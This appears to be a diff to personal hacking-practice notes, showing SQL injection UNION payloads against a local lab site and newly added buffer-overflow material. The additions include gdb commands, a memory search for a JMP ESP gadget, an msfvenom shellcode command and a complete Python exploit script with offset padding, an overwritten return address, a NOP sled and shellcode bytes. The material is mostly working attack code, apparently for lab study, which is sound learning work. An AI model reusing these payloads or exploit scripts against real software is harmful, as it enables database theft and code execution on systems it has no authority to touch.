@@ -104,3 +104,60 @@ RAM' UNION select 1,@@version; #       GIVES SQL VERSION
 
 http://0.0.0.0:40756/cases/productsCategory.php?category=1%20UNION%20SELECT%20Table_schema,column_name,Table_name%20FROM%20information_schema.columns;%20#
 http://0.0.0.0:40756/cases/productsCategory.php?category=1%20UNION%20SELECT%201,comment,data%20FROM%20sqlinjection.share4%20WHERE%20id=1337;%20#
+
+./func <<<$(./Desktop/Security/Linux/mybuff.py)        runs func and injects mybuff as the input
+
+./func "YahWeh"                   Command Line Argument
+Enter a string: 
+./func <<<$(echo "YahWeh")        User Input
+Enter a string: 
+
+
+env - gdb ./func                  Starts gdb without environment variables
+unset LINES(OR COLUMNS)           removes gdb environmental variables
+gdb ./func
+info functions
+pdisass main
+
+find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4    Searches starting after the heap to the end of the stack for a jump instruction pointing to the EIP
+
+#PAYLOADS
+  msfvenom -p linux/x86/exec CMD=ifconfig -b '\x00' -f python
+
+
+
+
+
+
+
+
+
+
+#BUFFEROVERFLOW SCRIPT
+
+#!/usr/bin/python2.7
+
+
+
+#OFFSET
+
+buf = "A" * 62  #OFFSET
+
+'''
+0xf7f650cf -> \xcf\x50\xf6\xf7
+0xf7f65343 -> \x43\x53\xf6\xf7
+0xf7f65497 -> \x97\x54\xf6\xf7
+0xf7f655cf -> \xcf\x55\xf6\xf7
+'''
+buf += "\x59\x3b\xde\xf7"  #EIP REGISTER - JMP ESP
+#msfvenom -p linux/x86/exec CMD=ifconfig -b '\x00' -f python
+buf += "\x90" * 10
+buf += b"\xba\xd3\xd9\xf0\xd0\xd9\xc7\xd9\x74\x24\xf4\x5d"
+buf += b"\x31\xc9\xb1\x0c\x31\x55\x12\x83\xc5\x04\x03\x86"
+buf += b"\xd7\x12\x25\x42\xe3\x8a\x5f\xc0\x95\x42\x4d\x87"
+buf += b"\xd0\x74\xe5\x68\x90\x12\xf6\x1e\x79\x81\x9f\xb0"
+buf += b"\x0c\xa6\x32\xa4\x06\x29\xb3\x34\x70\x4f\xd0\x5b"
+buf += b"\xec\xe9\x7f\xc4\xf0\xa2\x2c\x83\x10\x81\x53"
+print(buf)
+
+
